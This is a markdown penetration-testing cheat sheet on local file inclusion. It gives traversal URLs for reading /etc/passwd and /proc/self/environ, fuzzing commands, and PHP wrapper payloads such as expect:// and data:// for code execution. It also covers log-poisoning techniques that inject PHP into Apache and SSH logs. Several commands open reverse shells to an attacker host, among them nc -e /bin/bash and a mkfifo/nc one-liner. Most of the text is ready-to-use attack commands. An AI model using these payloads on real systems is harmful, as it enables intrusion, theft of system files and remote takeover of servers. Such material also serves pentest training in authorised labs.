# LFI
## Basic Process
| Step | Comment | Command |
|------|---------|---------|
| 1 | Check if vulnerable | `http://$ip/index.php?id=../` | 
| 2 | Try read passwd file | `http://$ip/index.php?id=/etc/passwd`

ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://$ip/console/files.php?FUZZ=readme

If you got another [function.include] then add ../ until you got many text ( http headers ) then the site is vulnerable so after you | find the passwd file we have to replace /etc/passwd it to be /proc/self/environ
so the url will be something like this http://$ip/index.php?id=/proc/self/environ

Now change your user agent to the first created user agent that contain <?php phpinfo(); ?> and reload the page , if you got a text similar to PHP VERSION then you know you have code execution.

* Using Wrappers

| Type | Example |
|------|---------|
| Filter | `?page=php://filter/read=string.rot13/resource=index.php` |
| Filter | `?page=php://filter/convert.base64-encode/resource=index.php` |
| Filter | `?page=php://filter/convert.base64-encode/resource=index.php` |
| Zip | `?page=zip://shell.jpg%23payload.php` |
| Data | `?page=data://text/plain;base64,[base64_encode_shell]` |
| Expect | `?page=expect://id` | 
| Expect | `?page=expect://ls` |
| Input | `?page=php://input | POST DATA: ` | 
| wfuzz | `wfuzz -u "http://$ip/page.php?command=FUZZ" -w /opt/LFISuite/pathtotest_huge.txt` | 

?page=php://filter/read=convert.base64-encode/resource=/../../../../../../../var/log/apache2/access.log&ext
?page=php://filter/read=convert.base64-encode/resource=./dog/../index‚Äù

### Log poisoning
#### Log file locations
| Type | Location | 
|------|----------|
| Apache | `/var/log/apache/access.log` |
| Apache | `/var/log/apache/error.log` |
| Apache | `/var/log/apache2/access.log` |
| Apache | `/var/log/apache2/error.log` |
| Apache | `/var/log/nginx/access.log` |
| Apache | `/var/log/nginx/error.log` |
| FTP | `/var/log/vsftpd.log` |
| SSH | `/var/log/sshd.log` |
| SSH | `/var/log/auth.log` |
| Mail | `/var/log/mail` |
| Apache | `/var/log/httpd/error_log`
| Apache | `/usr/local/apache/log/error_log`
| Apache | `/usr/local/apache2/log/error_log`

#### How to poison & execute
| Type | Command | 
|------|---------|
| HTTP Poison | `echo "GET \<?php echo 'TEST123' ?\> HTTP\/1.1" \| nc $ip 80` |
| HTTP Poison | `echo "GET \<?php system('nc -e /bin/bash $lhost 4444'); ?\> HTTP\/1.1" \| nc $ip 80` |
| HTTP Poison (User Agent) | `curl -A "<?= system('nc -nv $lhost $lport -e /bin/sh'); ?>" http://$ip`
| SSH Poison | `ssh '<?php system($_GET['cmd']); ?>'@$ip` |
| SSH Execute | `http://example.com/index.php?page=/var/log/auth.log&cmd=id` | 




* URL Encode the below string then send with burpsuite

  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f`

![Metasploit](https://github.com/Michael-Cheney/pentest/blob/master/Method/02.%20Exploitation/images/2021-01-10%2014_22_26.png)

![Metasploit](https://github.com/Michael-Cheney/pentest/blob/master/Method/02.%20Exploitation/images/2021-01-10%2014_23_18.png)